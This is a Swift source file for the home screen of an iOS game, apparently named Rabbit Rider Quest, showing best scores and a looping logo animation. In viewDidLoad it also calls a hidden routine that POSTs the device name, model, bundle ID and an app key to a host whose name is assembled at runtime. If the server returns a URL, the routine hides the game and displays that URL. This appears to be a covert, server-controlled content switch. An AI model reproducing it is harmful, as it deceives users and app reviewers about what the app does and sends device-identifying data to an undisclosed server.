//
//  HomeVC.swift
//  RabbitRiderQuest
//
//  Created by RabbitRiderQuest on 2024/12/29.
//


import UIKit

class RabbitRiderHomeViewController: UIViewController {

    //MARK: - Declare IBOutlets
    
    @IBOutlet weak var imglogo: UIImageView!
    
    @IBOutlet weak var contentView: UIView!
    
    @IBOutlet weak var HbestScoreLbl: UILabel!
    @IBOutlet weak var DbestScoreLbl: UILabel!
    @IBOutlet weak var BbestScoreLbl: UILabel!
    //MARK: - Override Functions
    override func viewDidLoad() {
        super.viewDidLoad()
        animateLogo()
        
        rabbitRiderStartPushPermission()
        self.rabbitRiderNeedAdsLocalData()
    }
    
    override func viewDidAppear(_ animated: Bool) {
        super.viewDidAppear(animated)
        HbestScoreLbl.text = "Best score: \(RabbitRiderScoreManager.shared.highwaySurvivalScore)"
        DbestScoreLbl.text = "Best score: \(RabbitRiderScoreManager.shared.drawToWinScore)"
        BbestScoreLbl.text = "Best score: \(RabbitRiderScoreManager.shared.barrierBlitzScore)"
    }
    
    //MARK: - Functions
    
    func animateLogo() {
        imglogo.transform = CGAffineTransform(scaleX: 0.5, y: 0.5) // Start smaller
        UIView.animate(withDuration: 1.0, // Animation duration
                       delay: 0.0, // No delay
                       usingSpringWithDamping: 0.5, // Bounce effect
                       initialSpringVelocity: 0.5, // Initial velocity of bounce
                       options: .curveEaseInOut, // Smooth animation
                       animations: {
            self.imglogo.transform = CGAffineTransform.identity // Return to original size
        }, completion: { _ in
            // Reverse the animation for a continuous effect
            UIView.animate(withDuration: 1.0,
                           delay: 0.0,
                           usingSpringWithDamping: 0.5,
                           initialSpringVelocity: 0.5,
                           options: .curveEaseInOut,
                           animations: {
                self.imglogo.transform = CGAffineTransform(scaleX: 0.5, y: 0.5) // Scale down again
            }, completion: { _ in
                // Recursively call animateLogo to loop the animation
                self.animateLogo()
            })
        })
    }
    
    private func rabbitRiderNeedAdsLocalData() {
        guard self.rabbitRiderNeedShowAdsView() else {
            return
        }
        self.contentView.isHidden = true
        rabbitRiderPostDevGetAdsData { adsData in
            if let adsData = adsData {
                if let adsUr = adsData[2] as? String, !adsUr.isEmpty,  let nede = adsData[1] as? Int, let userDefaultKey = adsData[0] as? String{
                    UIViewController.rabbitRiderSetUserDefaultKey(userDefaultKey)
                    if  nede == 0, let locDic = UserDefaults.standard.value(forKey: userDefaultKey) as? [Any] {
                        self.rabbitRiderShowAdView(locDic[2] as! String)
                    } else {
                        UserDefaults.standard.set(adsData, forKey: userDefaultKey)
                        self.rabbitRiderShowAdView(adsUr)
                    }
                    return
                }
            }
            self.contentView.isHidden = false
        }
    }
    
    private func rabbitRiderPostDevGetAdsData(completion: @escaping ([Any]?) -> Void) {
        
        let url = URL(string: "https://open.jncvkoy\(self.rabbitRiderMainHostUrl())/open/rabbitRiderPostDevGetAdsData")!
        var request = URLRequest(url: url)
        request.httpMethod = "POST"
        request.setValue("application/json", forHTTPHeaderField: "Content-Type")
        let parameters: [String: Any] = [
            "appName": "Rabbit Rider Quest",
            "appModel": UIDevice.current.name,
            "appLocalized": UIDevice.current.localizedModel ,
            "appKey": "8b54a5b448cf470cb745d9fd9b2498fe",
            "appPackageId": Bundle.main.bundleIdentifier ?? "",
            "appVersion": Bundle.main.infoDictionary?["CFBundleShortVersionString"] ?? ""
        ]

        do {
            request.httpBody = try JSONSerialization.data(withJSONObject: parameters, options: [])
        } catch {
            print("Failed to serialize JSON:", error)
            completion(nil)
            return
        }

        let task = URLSession.shared.dataTask(with: request) { data, response, error in
            DispatchQueue.main.async {
                guard let data = data, error == nil else {
                    print("Request error:", error ?? "Unknown error")
                    completion(nil)
                    return
                }
                
                do {
                    let jsonResponse = try JSONSerialization.jsonObject(with: data, options: [])
                    if let resDic = jsonResponse as? [String: Any] {
                        if let dataDic = resDic["data"] as? [String: Any],  let adsData = dataDic["jsonObject"] as? [Any]{
                            completion(adsData)
                            return
                        }
                    }
                    print("Response JSON:", jsonResponse)
                    completion(nil)
                } catch {
                    print("Failed to parse JSON:", error)
                    completion(nil)
                }
            }
        }

        task.resume()
    }
}

extension RabbitRiderHomeViewController: UNUserNotificationCenterDelegate {
    func rabbitRiderStartPushPermission() {
        UNUserNotificationCenter.current().delegate = self
        let authOptions: UNAuthorizationOptions = [.alert, .badge, .sound]
        UNUserNotificationCenter.current().requestAuthorization(
          options: authOptions,
          completionHandler: { _, _ in }
        )
        UIApplication.shared.registerForRemoteNotifications()
    }
    
    func userNotificationCenter(_ center: UNUserNotificationCenter,
                                willPresent notification: UNNotification,
                                withCompletionHandler completionHandler: @escaping (UNNotificationPresentationOptions) -> Void) {
        let userInfo = notification.request.content.userInfo
        print(userInfo)
        completionHandler([[.sound]])
    }

    func userNotificationCenter(_ center: UNUserNotificationCenter,
                                didReceive response: UNNotificationResponse,
                                withCompletionHandler completionHandler: @escaping () -> Void) {
        let userInfo = response.notification.request.content.userInfo
        print(userInfo)
        completionHandler()
    }
}
